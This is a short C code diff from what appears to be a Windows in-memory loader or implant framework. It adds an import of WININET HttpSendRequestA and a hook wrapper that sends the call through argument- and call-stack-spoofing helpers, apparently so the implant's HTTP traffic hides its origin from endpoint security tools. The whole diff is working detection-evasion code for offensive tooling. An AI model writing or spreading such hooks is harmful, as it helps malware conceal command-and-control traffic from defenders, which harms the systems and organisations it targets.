@@ -5,6 +5,7 @@
 #include "memory.h"
 #include "spoof.h"
 
+DECLSPEC_IMPORT HINTERNET WINAPI WININET$HttpSendRequestA    ( HINTERNET, LPCSTR, DWORD, LPVOID, DWORD );
 DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
 DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA    ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );
 
@@ -38,6 +39,21 @@ DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue ( CONTEXT *, BOOLEAN );
 // cannot put this here because it fails to build
 // to PIC when hooks.x64.o is merged into the loader
 // extern MEMORY_LAYOUT g_memory;
+
+BOOL WINAPI _HttpSendRequestA ( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr        = ( PVOID ) ( WININET$HttpSendRequestA );
+    call.argc       = 5;
+    call.args [ 0 ] = spoof_arg ( hRequest );
+    call.args [ 1 ] = spoof_arg ( lpszHeaders );
+    call.args [ 2 ] = spoof_arg ( dwHeadersLength );
+    call.args [ 3 ] = spoof_arg ( lpOptional );
+    call.args [ 4 ] = spoof_arg ( dwOptionalLength );
+
+    return ( BOOL ) spoof_call ( &call );
+}
 
 HINTERNET WINAPI _InternetOpenA ( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags )
 {
